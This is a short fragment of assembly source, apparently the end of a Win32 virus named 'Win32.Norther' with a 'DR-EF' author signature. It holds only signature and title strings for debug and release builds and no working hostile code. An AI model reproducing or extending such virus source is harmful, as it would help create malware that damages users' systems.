	Message		db	"Win32.Norther By DR-EF",0
if	DEBUG
	Title_		db	"[Win32.Norther]",0
else
	Title_		db	"[Win32.Norther] Relese Version",0
endif
	
End Norther